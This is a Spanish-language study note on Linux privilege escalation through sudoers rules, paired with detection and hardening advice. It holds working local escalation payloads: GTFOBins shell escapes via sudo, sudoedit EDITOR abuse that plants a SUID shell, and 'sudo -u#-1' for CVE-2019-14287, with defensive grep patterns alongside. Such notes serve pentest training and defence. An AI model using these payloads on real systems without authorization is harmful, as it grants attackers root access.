---
tags:
  - ciberseguridad
  - escalada
  - abuso-sudoers
tipo: concepto
estado: terminado
---

# Abuso de Privilegios Sudoers

El archivo **/etc/sudoers** es un archivo de configuración fundamental en sistemas Linux que se utiliza para controlar el acceso de los usuarios a las diferentes acciones que pueden realizar con privilegios elevados en el sistema. Este archivo contiene una lista de usuarios y grupos de usuarios que tienen permisos para realizar tareas de administración. Para el atacante, es la primera puerta a comprobar tras obtener una shell: **`sudo -l` es la enumeración de privilegios del propio usuario** y su salida define exactamente qué tan cerca está de root.

> [!info] Formato y Edición de `sudoers`
> El archivo `/etc/sudoers` no debe ser editado directamente con un editor de texto como `vi` o `nano`. En su lugar, se debe utilizar el comando `visudo`. Este comando abre el archivo en un editor (generalmente `vi` por defecto) y realiza una verificación de sintaxis antes de guardar los cambios, previniendo errores que podrían bloquear el acceso `sudo` al sistema.
>
> La sintaxis básica de una entrada en `sudoers` es:
> `usuario HOST=(RUNAS) COMANDO`
>
> Donde:
> *   **usuario**: El nombre de usuario o `%grupo`.
> *   **HOST**: El host desde donde se permite la ejecución (normalmente `ALL`).
> *   **RUNAS**: El usuario o grupo bajo el cual se ejecuta el comando (normalmente `ALL` o `root`).
> *   **COMANDO**: El comando o alias de comando que se puede ejecutar.

El comando **sudo** (del inglés *superuser do*) permite a los usuarios ejecutar comandos como superusuario (root) o como otro usuario con privilegios especiales, según lo especificado en el archivo `sudoers`.

> [!info] `sudo` vs `su`
> Mientras que `su` (switch user) requiere la contraseña del usuario al que se desea cambiar (o la de root si no se especifica usuario), `sudo` requiere la contraseña del *propio usuario* que ejecuta el comando (a menos que se configure `NOPASSWD`). `sudo` ofrece un control más granular sobre qué comandos puede ejecutar un usuario específico y bajo qué condiciones, sin necesidad de compartir la contraseña de `root`.

## Mecánica: qué hace `sudo` en cada ejecución

Cuando corrés `sudo cmd`, el flujo real es:

1. **Lee la policy**: `/etc/sudoers` + `/etc/sudoers.d/*` (incluidos por `@includedir`).
2. **Resuelve la regla**: match por usuario → `%grupo` → `User_Alias`; luego host; luego `Runas_Alias`; luego `Cmnd_Alias`.
3. **Aplica tags**: `NOPASSWD` (salta autenticación), `SETENV`/`NOSETENV` (permite `-E` y presets), `LOG_INPUT`/`LOG_OUTPUT`.
4. **Aplica Defaults**: `env_reset`, `secure_path`, `env_keep`, `always_set_home`, `use_pty`…
5. **Autentica** (si no hay `NOPASSWD`): pide la contraseña **del usuario**, no la de root.
6. **Ejecuta** con el EUID indicado (`root` por defecto, o el `Runas` especificado), tras limpiar/limitar el entorno según los Defaults.

> [!warning] `env_reset` y `secure_path` cambian el juego
> - `env_reset` (activo por defecto): sudo purga el entorno antes de ejecutar — por eso `sudo python` **no** honra tu `LD_PRELOAD`/`PYTHONPATH` malicioso. `sudo -E` solo preserva variables si la regla tiene tag `SETENV` o `SETENV` implícito por `ALL`.
> - `secure_path`: sudo **sobreescribe el PATH** con una ruta fija (`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`). Por eso el truco clásico de `PATH` hijack (`PATH=/tmp:$PATH sudo script`) **no funciona** con `secure_path` activo — hay que atacar el propio binario permitido, no su PATH.
> - Excepción peligrosa: si la política tiene `SETENV` y un comando acotado, podés inyectar `PYTHONPATH`, `LD_PRELOAD` (solo si el binario no es SUID… pero sudo lo es → el dynamic linker ignora `LD_PRELOAD` de euid distinto: por eso el truco real es `LD_LIBRARY_PATH` con reglas `SETENV` o librerías del propio programa).

## `sudo -l`: leer la superficie de ataque

```bash
sudo -l
```

Salida típica (interpretación paso a paso):

```
Matching Defaults entries for user on host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:...
User user may run the following commands on host:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/find
    (www-data) NOPASSWD: /usr/bin/vi /var/log/*.log
```

| Fragmento | Significado | Explotación |
|---|---|---|
| `(ALL : ALL) ALL` | cualquier comando, cualquier Runas | shell root directa: `sudo -i` |
| `NOPASSWD: ALL` | sin contraseña | idem, sin necesidad de password |
| `NOPASSWD: /usr/bin/find` | solo `find` como root | GTFOBins: `sudo find . -exec /bin/sh \;` |
| `(ALL) /usr/bin/awk` | `awk` como root | `sudo awk 'BEGIN{system("/bin/sh")}'` |
| `NOPASSWD: /usr/bin/vi /var/log/*.log` | wildcard de rutas | ver "wildcards" abajo |
| `(root) /usr/bin/python3 /opt/script.py` | script concreto | escribir en `/opt/script.py` si es writable, o `python3 -c` si el match lo permite |
| `NOPASSWD: /usr/bin/dmesg` | lectura de logs | info leak; escalar según salida |

> [!tip] Interpretando `sudo -l` y `NOPASSWD`
> Busca líneas que contengan `(ALL : ALL) ALL` o `(ALL : ALL) NOPASSWD: ALL`. La presencia de `NOPASSWD` es crítica, ya que indica que el usuario puede ejecutar esos comandos sin necesidad de introducir su contraseña. Si un usuario tiene `NOPASSWD` para un comando que puede ser abusado (como un editor de texto, un intérprete de comandos o un binario con capacidades de ejecución de comandos), esto representa una vulnerabilidad directa para la escalada de privilegios.

Si `sudo -l` pide contraseña y no la tenés, no descartes: a veces **`sudo -n -l`** (non-interactive) revela reglas `NOPASSWD` sin prompt, y ciertas configs solo listan tras auth. Guardá la salida: es el índice de ataque.

## Catálogo GTFOBins para entradas de sudo

La pregunta no es "¿qué binarios hay?" sino **"de mis reglas sudo, cuál tiene bypass en GTFOBins?"**. Catálogo de los binarios más frecuentes:

| Binario | Payload con sudo | Qué obtiene |
|---|---|---|
| `bash` / `sh` | `sudo bash` | shell root directa |
| `python`/`python3` | `sudo python3 -c 'import os; os.execl("/bin/bash","bash")'` | shell root |
| `perl` | `sudo perl -e 'exec "/bin/sh";'` | shell root |
| `ruby` | `sudo ruby -e 'exec "/bin/sh"'` | shell root |
| `vim`/`vi`/`nano` | `sudo vim -c ':!/bin/sh'` | shell root (vim escapa a shell) |
| `less`/`more`/`man` | `sudo less /etc/hosts` → `!sh` | shell root |
| `find` | `sudo find /etc -exec /bin/sh \; -quit` | shell root |
| `nmap` | `sudo nmap --interactive` → `!sh` (≤5.21) | shell root |
| `awk`/`gawk` | `sudo awk 'BEGIN{system("/bin/sh")}'` | shell root |
| `sed` | `sudo sed -n '1e exec /bin/sh' /etc/hosts` | shell root |
| `env` | `sudo env /bin/sh` | shell root |
| `tcpdump` | `sudo tcpdump -z /bin/sh -Z root -i lo` | shell root al finalizar |
| `capsh` | `sudo capsh --gid=0 --uid=0 -- -i` | shell root |
| `awk`/`ed`/`ex` | variantes `system()`/`:!sh` | shell root |
| `cp`/`mv`/`chmod` | sobrescribir binario SUID o `/etc/passwd` (si la regla lo permite) | root persistente |
| `tee` | `echo 'root:...' \| sudo tee /etc/shadow` | root |
| `docker` | `sudo docker run -v /:/mnt ...` | root vía contenedor (ver [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]]) |
| `systemctl` | `sudo systemctl edit` con `ExecStart=` arbitrario | root |
| `pkexec` | ver PwnKit abajo | root |

Fuente de verdad: cada binario tiene su página en https://gtfobins.github.io/ con la sección **Sudo** exacta. Regla de oro: **todo binario con regla sudo merece una búsqueda en GTFOBins antes de pasar al siguiente vector**.

## Técnicas avanzadas sobre reglas sudo

### 1. `sudoedit` / `EDITOR` / `VISUAL`

Cuando la regla permite **solo** editar un archivo (`sudoedit /etc/apache2/apache2.conf`), sudo invoca el editor definido en `EDITOR`/`VISUAL` (o `SUDO_EDITOR`) **con los privilegios de edición del propio sudo**:

```bash
# Suponiendo: user ALL=(ALL) sudoedit /etc/hosts
export EDITOR='vim -c ":!/bin/sh"'     # o VISUAL
sudoedit /etc/hosts
# El editor abre con la capacidad de escribir el archivo y con el truco :!sh
# Variantes modernas:
export EDITOR='sh -c "cp /bin/bash /tmp/b; chmod u+s /tmp/b" #'
sudoedit /etc/hosts
```

Mitigación relacionada (CVE-2010-4708 / historical): sudo ≤1.8.0-1.8.3 filtraba el entorno en `sudoedit`; hoy `sudoedit` sigue siendo sensible — auditar siempre quién define `EDITOR` en reglas acotadas.

### 2. Wildcards en la regla (`sudo /usr/bin/vi /var/log/*`)

El matching de sudo se hace **por argumentos**: si la regla termina en `/*`, cualquier argumento que *empiece* por ese prefijo pasa. La clásica es la comodín en los argumentos del binario:

```bash
# Regla: sudo vi /var/log/*
# vi interpreta los argumentos como archivos; usamos opciones de vi:
sudo vi /var/log/anything --help      # no siempre
# pero sobre todo:
sudo vi -c ':!/bin/sh' /var/log/x     # si el prefijo matchea
# Alternativa general para reglas con '*':
sudo /usr/bin/nmap '*'                # depende de cómo sudo matchee (sufijos)
```

> [!warning] El truco `sudo -u#-1` (CVE-2019-14287)
> Con reglas que restringen Runas **menos root** (`(ALL, !root)` o `(ALL, !#0)`) en sudo < 1.8.28, `sudo -u#-1 id` se interpreta como uid 0 → root. Verificá la versión (`sudo --version`) y probá siempre `sudo -u#-1 id` cuando veas `(ALL, !root)`.

### 3. Reglas sobre scripts propios

```bash
# Regla: sudo /opt/backup.sh
ls -la /opt/backup.sh
# → writable por vos: editar y ejecutar → root
# → no writable: revisar qué ejecuta (source, PATH, .so en LD_LIBRARY_PATH)
```

Si el script hace `source $HOME/...` o llama comandos sin ruta absoluta → [[PATH Hijacking]] o [[Python Library Hijacking]] como segundo salto. La detección de cuándo se ejecita (si es por cron) va en [[Detección y Explotación de Tareas Cron]].

### 4. pkexec (mención breve)

`pkexec` (polkit) es el "sudo" gráfico. Famoso por **PwnKit (CVE-2021-4034)**: argumentos manipulados → ejecución como root en polkit < 0.120. Aunque PwnKit está parcheado en distros actuales, sigue en la checklist: `sudo -l` no cubre `pkexec`, y reglas de polkit mal configuradas (`org.freedesktop.*` con `allow_active`) conceden acciones administrativas. Comprobación: `pkexec --version; dpkg -l policykit-1 2>/dev/null`.

## Detección (lado defensor)

- **Logs de sudo**: `/var/log/auth.log` (Debian/Ubuntu) o `/var/log/secure` (RHEL/CentOS):
  ```bash
  grep sudo /var/log/auth.log | grep -E 'COMMAND|authentication failure'
  # patrón: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/find
  ```
- Cada ejecución con `sudo` deja `COMMAND=` con el binario y argumentos → reglas de alerta sobre comandos raros (`vi`, `find`, `python` vía sudo).
- `sudo` con `LOG_INPUT`/`LOG_OUTPUT` en la regla graba stdin/stdout completo (`/var/log/sudo-io/`).
- **AIDE/Tripwire** sobre `/etc/sudoers` y `/etc/sudoers.d/` (cualquier cambio no planificado).
- Herramientas de monitoreo de integridad de archivos (FIM) como **AIDE** o **Tripwire** pueden configurarse para alertar sobre cualquier modificación en `/etc/sudoers`; también es crucial revisar los logs de `sudo` para detectar intentos de uso no autorizados o inusuales.

## Impacto

- Regla `ALL` o binario GTFOBins → **shell root inmediata**.
- Regla acotada a edición/escritura → **root persistente** (sobrescribir `passwd`, plantar SUID, añadir clave SSH).
- Reglas `(ALL, !root)` + sudo vulnerable → root vía `sudo -u#-1`.
- Incluso sin root: reglas `(otro usuario)` permiten **lateral movement** a ese usuario (p. ej. `(postgres)` para tocar la DB).

## Sección defensiva: endurecimiento

```bash
# 1. Editar siempre con visudo (valida sintaxis)
visudo -f /etc/sudoers
visudo -c                    # chequeo de sintaxis de todo el árbol

# 2. Reglas mínimas, rutas absolutas, con argumentos
#    Mal:  usuario ALL=(ALL) ALL
#    Bien: usuario ALL=(root) NOPASSWD: /usr/bin/systemctl restart nginx.service

# 3. Defaults recomendados (ya vienen en instalados modernos, verificar)
Defaults    env_reset
Defaults    mail_badpass
Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Defaults    use_pty
Defaults    logfile="/var/log/sudo.log"

# 4. Restringir Runas cuando el comando no necesita root
usuario ALL=(postgres) NOPASSWD: /usr/bin/pg_dump

# 5. Incluir /etc/sudoers.d con permisos correctos
ls -l /etc/sudoers.d        # debe ser 0440 root:root y sin ~ (archivos con ~ se ignoran)

# 6. Reducir quién tiene sudo
getent group sudo wheel admin
grep -R 'ALL=(ALL)' /etc/sudoers /etc/sudoers.d/

# 7. Monitoreo
grep -R COMMAND= /var/log/auth.log /var/log/secure | grep -E 'vi|find|python|perl'
```

Aplicá siempre el **principio de mínimo privilegio**: los usuarios solo deben tener los permisos `sudo` estrictamente necesarios para realizar sus tareas. Evita configuraciones amplias como `NOPASSWD: ALL`. En su lugar, especifica comandos exactos y rutas absolutas — por ejemplo, en lugar de `ALL`, usa `/usr/bin/apt update`.

> [!info] Auditoría y Monitoreo
> Herramientas de monitoreo de integridad de archivos (FIM) como `AIDE` o `Tripwire` pueden ser configuradas para alertar sobre cualquier modificación en `/etc/sudoers`. También es crucial revisar los logs de `sudo` (generalmente en `/var/log/auth.log` o `/var/log/secure`) para detectar intentos de uso de `sudo` no autorizados o inusuales.

## Errores comunes

1. **No leer la salida completa de `sudo -l`**: las entradas de `Matching Defaults` explican por qué un truco de entorno falla (`env_reset`, `secure_path`).
2. **Probar `PATH` hijack con `secure_path` activo** → no funciona; atacar el binario, no el PATH (ver [[PATH Hijacking]]).
3. **Olvidar el Runas**: `(ALL) /usr/bin/vi` ejecuta vi **como root**, pero `(postgres) /usr/bin/vi` solo como postgres — no es root, es lateral.
4. **Asumir que `NOPASSWD` es requisito**: sin `NOPASSWD` basta con conocer la contraseña del usuario (y en CTFs suele ser el usuario actual, ya la tenés).
5. **False positive de "binario abusable"**: GTFOBins lista capacidades del binario *en general*; si la regla acota argumentos (`/usr/bin/vi /var.log/*`), solo funciona el payload que respeta ese prefijo.
6. **Ignorar `sudo --version`**: CVEs de sudo (14287, CVE-2021-3156 *Baron Samedit*) dependen de versión. Baron Samedit: `sudoedit -s` con argumento largo → heap overflow en sudo < 1.9.5p2.

## Cheatsheet

```bash
sudo -l                      # superficie sudo del usuario
sudo -n -l                   # sin prompt (solo NOPASSWD visibles)
sudo --version               # CVEs aplicables (14287, Baron Samedit)
sudo -i                      # si hay ALL → shell root
sudo -u#-1 id                # si la regla es (ALL, !root) y sudo <1.8.28

# GTFOBins patterns
sudo find . -exec /bin/sh \;
sudo vim -c ':!/bin/sh'
sudo less /etc/hosts         # luego: !sh
sudo awk 'BEGIN{system("/bin/sh")}'
sudo python3 -c 'import os;os.execl("/bin/bash","bash")'

# sudoedit
export EDITOR='vim -c ":!/bin/sh"'; sudoedit /archivo_permitido

# Hardening
visudo -c; visudo -f /etc/sudoers.d/regla
Defaults env_reset, secure_path, use_pty
```

## Referencias

- GTFOBins — sección Sudo de cada binario: https://gtfobins.github.io/
- sudo manual (Defaults, tags, sudoedit): https://www.sudo.ws/docs/man/sudoers.man/
- HackTricks — sudo: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/sudo.html
- PwnKit — CVE-2021-4034: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
- Notas internas: [[Abuso de Permisos en Linux y LSE]], [[Privilegios SUID en Linux]], [[PATH Hijacking]], [[Grupos de Linux y Escalada de Privilegios]]

## Relacionadas

- [[Abuso de Permisos en Linux y LSE]] — `sudo -l` como paso 1 de la enumeración
- [[Privilegios SUID en Linux]] — el equivalente "por binario" de esta misma superficie
- [[PATH Hijacking]] — por qué `secure_path` lo neutraliza y cuándo no
- [[Python Library Hijacking]] — segundo salto desde un script Python permitido
- [[Elevación de Privilegios mediante Explotación de Binarios]] — vulnerabilidades en los binarios permitidos
- [[Detección y Explotación de Tareas Cron]] — reglas sudo disparadas por tareas programadas
- [[Grupos de Linux y Escalada de Privilegios]] — `%sudo` y la entrada de grupo que otorga `ALL`
